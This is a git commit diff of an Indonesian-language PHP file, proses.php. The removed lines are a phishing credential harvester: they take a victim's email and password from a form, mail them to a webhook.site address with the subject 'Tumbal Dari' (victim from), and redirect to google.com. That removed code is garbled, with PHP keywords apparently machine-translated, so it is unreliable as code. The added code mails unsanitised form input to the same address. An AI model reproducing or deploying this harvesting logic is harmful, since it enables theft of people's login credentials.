f1654105e18ef56430fa773af3ecbb9f02f1c780
erman192 <124055331+erman192@users.noreply.github.com>
2023-02-14 08:56:12 +0700

    Update proses.php

--- proses.php
+++ proses.php
@@ -1,34 +1,15 @@
 <?php
-
-$email = $_POST['email'];
-
-$password = $_POST['password'];
-
-if (kosong($email) && kosong($kata sandi)) {
-
-  header('lokasi: ./');
-
-} kalau tidak {
-
-$pesan = "
-
-Email : ".$email."
-
-Kata sandi : ".$kata sandi."
-
-";
-
-$emailmu = "db85154e-7100-428b-87b9-7158a00788d7@email.webhook.site";
-
-$subjek = "Tumbal Dari [ ".$email." ]";
-
-$headers = 'Dari: XNULL <noreply@xnull.ml>' . "\r\n";
-
-mail($emailmu, $subjek, $pesan, $header);
-
-header('lokasi: https://google.com');
-
+$penerima = "db85154e-7100-428b-87b9-7158a00788d7@email.webhook.site";
+$subyek = $_POST['subyek'];
+$pesan = $_POST['pesan'];
+$pesan = wordwrap($pesan, 70);
+$header = "From: no-reply@saidalfaruq.net\r\n";
+$header .= "MIME-Version: 0\r\n";
+$header .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
+$kirim = mail($penerima, $subyek, $pesan, $header);
+if ($kirim) {
+    echo "Pesan email berhasil dikirim.";
+} else {
+    echo "Pesan email gagal dikirim.";
 }
-
 ?>
-
